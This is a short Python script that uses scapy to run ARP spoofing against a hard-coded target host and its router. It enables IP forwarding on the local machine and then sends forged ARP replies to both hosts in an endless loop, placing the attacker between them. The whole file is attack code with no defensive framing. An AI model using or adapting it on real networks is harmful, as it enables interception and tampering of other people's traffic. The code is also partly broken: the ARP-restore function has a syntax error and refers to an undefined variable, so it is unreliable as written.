#!/usr/bin/env python3

from time import sleep
import scapy.all as scapy
import subprocess

from scapy.packet import Packet

# Hard coded values to replace via optparse
target = {"name": "target", "ip": "10.211.55.6", "mac": "00:1c:42:aa:7c:10"}
router = {"name": "router", "ip": "10.211.55.1", "mac": "00:1c:42:00:00:18"}
verbose = False

def get_mac(options):
    ''' TODO '''
    arp_request = scapy.ARP(pdst=options["ip"])
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    targets_found = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    target_mac_address = targets_found[0][1].hwsrc
    if verbose:
        print("Target MAC: " + target_mac_address)
    return(target_mac_address)

def spoof(target, spoof):
    ''' TODO '''
    target_mac = get_mac(target) 
    packet = scapy.ARP(op=2, pdst=target["ip"], hwdst=target["mac"], psrc=spoof["ip"])
    if verbose:
        print(packet.show())
        print(packet.summary())
    scapy.send(packet, verbose=False)

def restore_arp(destination_ip, source_ip):
    destination_mac = get_mac(options)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=)

subprocess.call(["bash", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"]) # Setup routing/forwarding locally

sent_packet_count = 0
try:
    while True:
        spoof(target, router)
        sent_packet_count = sent_packet_count + 1
        print("\r[+] arp_spoof packet: " + str(sent_packet_count) + " to " + target["name"], end="")
        spoof(router, target)
        sent_packet_count = sent_packet_count + 1
        print(" packet: " + str(sent_packet_count) + " to " + router["name"], end="")
        sleep(1)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL +C .... Quitting.")